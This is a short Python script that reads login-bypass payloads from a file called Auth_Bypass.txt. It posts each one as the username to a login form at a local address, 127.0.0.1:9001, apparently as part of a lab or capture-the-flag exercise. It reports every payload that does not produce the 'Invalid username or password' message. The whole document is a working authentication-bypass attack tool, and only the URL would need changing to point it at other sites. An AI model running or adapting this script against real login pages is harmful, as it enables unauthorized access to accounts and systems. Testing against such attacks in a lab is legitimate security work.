#!/usr/bin/env python3

import requests

with open("Auth_Bypass.txt", "r") as file:
    content = file.readlines()
    payloads = [x.strip() for x in content]

for payload in payloads:
    sess = requests.session()

    data = {
            "username" : payload,
            "password" : "admin",
            "submit" : "Submit"
            }
    validate = sess.post("http://127.0.0.1:9001/index.php", data=data)
    if "Invalid username or password" in validate.text:
        pass
    else:
        print("[+] Success !!\n")
        print("[+] {0}\n".format(payload))
